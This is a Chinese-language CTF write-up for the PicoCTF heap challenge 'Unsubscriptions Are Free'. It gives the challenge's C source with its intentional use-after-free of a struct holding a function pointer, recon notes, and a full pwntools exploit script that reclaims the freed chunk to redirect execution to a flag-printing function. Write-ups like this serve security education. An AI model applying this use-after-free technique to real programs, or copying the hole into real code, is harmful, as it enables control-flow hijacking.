---
title: PicoCTF - Unsubscriptions Are Free
tags: [PicoCTF, CTF, PWN]

category: "Security｜Practice｜PicoCTF｜PWN"
---

# PicoCTF - Unsubscriptions Are Free
<!-- more -->

## Background
Heap Exploitation / Used After Free

## Source code
:::spoiler Source Code
```cpp
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <ctype.h>

#define FLAG_BUFFER 200
#define LINE_BUFFER_SIZE 20


typedef struct {
	uintptr_t (*whatToDo)();
	char *username;
} cmd;

char choice;
cmd *user;

void hahaexploitgobrrr(){
 	char buf[FLAG_BUFFER];
 	FILE *f = fopen("flag.txt","r");
 	fgets(buf,FLAG_BUFFER,f);
 	fprintf(stdout,"%s\n",buf);
 	fflush(stdout);
}

char * getsline(void) {
	getchar();
	char * line = malloc(100), * linep = line;
	size_t lenmax = 100, len = lenmax;
	int c;
	if(line == NULL)
		return NULL;
	for(;;) {
		c = fgetc(stdin);
		if(c == EOF)
			break;
		if(--len == 0) {
			len = lenmax;
			char * linen = realloc(linep, lenmax *= 2);

			if(linen == NULL) {
				free(linep);
				return NULL;
			}
			line = linen + (line - linep);
			linep = linen;
		}

		if((*line++ = c) == '\n')
			break;
	}
	*line = '\0';
	return linep;
}

void doProcess(cmd* obj) {
	(*obj->whatToDo)();
}

void s(){
 	printf("OOP! Memory leak...%p\n",hahaexploitgobrrr);
 	puts("Thanks for subsribing! I really recommend becoming a premium member!");
}

void p(){
  	puts("Membership pending... (There's also a super-subscription you can also get for twice the price!)");
}

void m(){
	puts("Account created.");
}

void leaveMessage(){
	puts("I only read premium member messages but you can ");
	puts("try anyways:");
	char* msg = (char*)malloc(8);
	read(0, msg, 8);
}

void i(){
	char response;
  	puts("You're leaving already(Y/N)?");
	scanf(" %c", &response);
	if(toupper(response)=='Y'){
		puts("Bye!");
		free(user);
	}else{
		puts("Ok. Get premium membership please!");
	}
}

void printMenu(){
 	puts("Welcome to my stream! ^W^");
 	puts("==========================");
 	puts("(S)ubscribe to my channel");
 	puts("(I)nquire about account deletion");
 	puts("(M)ake an Twixer account");
 	puts("(P)ay for premium membership");
	puts("(l)eave a message(with or without logging in)");
	puts("(e)xit");
}

void processInput(){
  scanf(" %c", &choice);
  choice = toupper(choice);
  switch(choice){
	case 'S':
	if(user){
 		user->whatToDo = (void*)s;
	}else{
		puts("Not logged in!");
	}
	break;
	case 'P':
	user->whatToDo = (void*)p;
	break;
	case 'I':
 	user->whatToDo = (void*)i;
	break;
	case 'M':
 	user->whatToDo = (void*)m;
	puts("===========================");
	puts("Registration: Welcome to Twixer!");
	puts("Enter your username: ");
	user->username = getsline();
	break;
   case 'L':
	leaveMessage();
	break;
	case 'E':
	exit(0);
	default:
	puts("Invalid option!");
	exit(1);
	  break;
  }
}

int main(){
	setbuf(stdout, NULL);
	user = (cmd *)malloc(sizeof(user));
	while(1){
		printMenu();
		processInput();
		//if(user){
			doProcess(user);
		//}
	}
	return 0;
}

```
:::

## Recon
這題該怎麼說呢，有點像是被設計好的問題
1. 首先觀察整體的file
    ```bash
    $ file vuln
    vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=89699d062dc4f47448ba7c5c03105267c060ce30, not stripped
    $ checksec vuln
    [*] '/mnt/d/NTU/CTF/PicoCTF/PWN/Unsubscriptions Are Free/vuln'
        Arch:     i386-32-little
        RELRO:    Partial RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      No PIE (0x8048000)
    ```
    保護機制雖然沒有全開，不過應該是一個heap題
2. source code有一個`hahaexploitgobrrr` function，是print出flag的function所以我們的目標很明確，就是要想辦法踩到這個function，而`s()`/`p()`/`m()`都是無用的資訊
3. 遇到這種heap的題目，我會先看哪裡有malloc和free，確保幾個簡單的exploitation的可能性，例如uaf或double free之類的，而i function有一個free，是要註銷帳號的功能，但是main function中的`doProcess(user);`卻持續使用user這個變數，所以這個就是一個典型的UAF漏洞(我也是看了別人的WP[^uaf_wp_martin][^uaf_wp_Dvd848]後才知道他的題目已經有提示了，一開始是我想的太複雜了)，試想如果一開始我先輸入`i`，讓程式`free(user)`，接著他就會執行`doProcess(user)`也就是user指向的function pointer，如果我們可以拿到被free掉的user這個chunk然後輸入`hahaexploitgobrrr`這個function的address，那我們就可以拿到flag了
4. 所以重點來了，要怎麼拿到被free掉的chunk呢?這個程式==也很好心的==幫我們實作了`leaveMessage`這個function，他會malloc 8 bytes，其實就剛好是user的大小，所以如果要拿8 bytes的chunk他會先到Tcache搜尋，然後給我們寫一些資訊，此時我們就可以寫上`hahaexploitgobrrr`這個function的address(address的資訊可以透過`s` function得知)
5. 綜合以上資訊可以開寫script

## Exploit
```python
from pwn import *

r = process('./vuln')
# r = remote('mercury.picoctf.net', 61817)

r.recvuntil(b'(e)xit\n')
r.sendline(b'i')
r.recvuntil(b"You're leaving already(Y/N)?\n")
r.sendline(b'Y')

r.recvuntil(b'(e)xit\n')
r.sendline(b's')
r.recvuntil(b'OOP! Memory leak...0x')
hahaexploitgobrrr_addr = int(str(r.recv(7))[2:-1], 16)
success(hahaexploitgobrrr_addr)

r.recvuntil(b'(e)xit\n')
r.sendline(b'l')
r.recvuntil(b'try anyways:\n')
raw_input()
r.sendline(p64(hahaexploitgobrrr_addr))

success(f'Flag: {r.recvline().strip().decode()}')

r.close()
```

## Reference
[^uaf_wp_martin]:[ picoCTF 2021 Unsubscriptions Are Free ](https://youtu.be/ffJRcNEyApI)
[^uaf_wp_Dvd848]:[Unsubscriptions Are Free WP](https://github.com/Dvd848/CTFs/blob/master/2021_picoCTF/Unsubscriptions_Are_Free.md)